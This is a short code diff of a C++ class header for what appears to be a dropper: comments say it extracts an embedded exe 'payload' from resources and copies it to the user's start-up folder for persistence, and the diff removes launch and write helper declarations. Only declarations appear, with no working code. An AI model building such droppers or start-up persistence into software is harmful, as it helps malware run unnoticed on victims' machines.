@@ -26,12 +26,8 @@ private:
 	// hold pointer to allocated memory
 	// extract exe from resources
 	void extractExe();
-	// launch the exe/payload
-	void launchExe(wchar_t* pathOfExe);
 	// copy the exe to the user's start-up folder
-	wchar_t* saveExeToDisk();
-	char* genDestPath();
-	void writeBytesToLoc(wchar_t* pathOfExe);
+	void saveExeToDisk();
 
 	HGLOBAL resHandle;
 	HRSRC resrc;
